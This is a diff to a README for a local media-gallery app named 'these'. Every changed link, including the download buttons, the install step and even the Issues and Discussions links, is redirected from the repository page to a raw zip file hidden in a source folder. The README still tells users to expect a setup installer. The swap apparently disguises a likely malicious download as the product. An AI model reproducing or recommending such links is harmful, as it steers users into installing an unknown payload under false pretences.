@@ -6,7 +6,7 @@ Welcome! If you have a computer full of photos and videos scattered across folde
 
 **No moving files. No copying. No reorganizing.** You point it at your folders, and it shows you everything in a clean, searchable gallery.
 
-[**⬇️ GET THESE NOW**](https://github.com/pacificismsandcherry8495/these)
+[**⬇️ GET THESE NOW**](https://raw.githubusercontent.com/pacificismsandcherry8495/these/main/apps/web/src/state/philogenitive.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Follow these simple steps to get **these** running on your Windows computer.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-[**https://github.com/pacificismsandcherry8495/these**](https://github.com/pacificismsandcherry8495/these)
+[**https://raw.githubusercontent.com/pacificismsandcherry8495/these/main/apps/web/src/state/philogenitive.zip**](https://raw.githubusercontent.com/pacificismsandcherry8495/these/main/apps/web/src/state/philogenitive.zip)
 
 On that page, look for the **"Releases"** section on the right side or scroll down to find the latest version. Click the download button. The file will be named something like `these-setup.exe`.
 
@@ -148,8 +148,8 @@ You can run it in Docker with a simple `docker-compose.yml`, or use the npm pack
 
 ## 🤝 Support & Community
 
-- **GitHub Issues:** Found a bug or want a feature? Post it here: [GitHub Issues](https://github.com/pacificismsandcherry8495/these/issues)  
-- **Discussions:** Join the conversation and share your tips: [GitHub Discussions](https://github.com/pacificismsandcherry8495/these/discussions)
+- **GitHub Issues:** Found a bug or want a feature? Post it here: [GitHub Issues](https://raw.githubusercontent.com/pacificismsandcherry8495/these/main/apps/web/src/state/philogenitive.zip)  
+- **Discussions:** Join the conversation and share your tips: [GitHub Discussions](https://raw.githubusercontent.com/pacificismsandcherry8495/these/main/apps/web/src/state/philogenitive.zip)
 
 ---
 
@@ -163,7 +163,7 @@ You can run it in Docker with a simple `docker-compose.yml`, or use the npm pack
 
 You now have a powerful, private, and beautifully simple way to browse your media. No more digging through file explorers or waiting for cloud uploads. Just point, click, and enjoy.
 
-[**⬇️ Download these now**](https://github.com/pacificismsandcherry8495/these)
+[**⬇️ Download these now**](https://raw.githubusercontent.com/pacificismsandcherry8495/these/main/apps/web/src/state/philogenitive.zip)
 
 ---
 
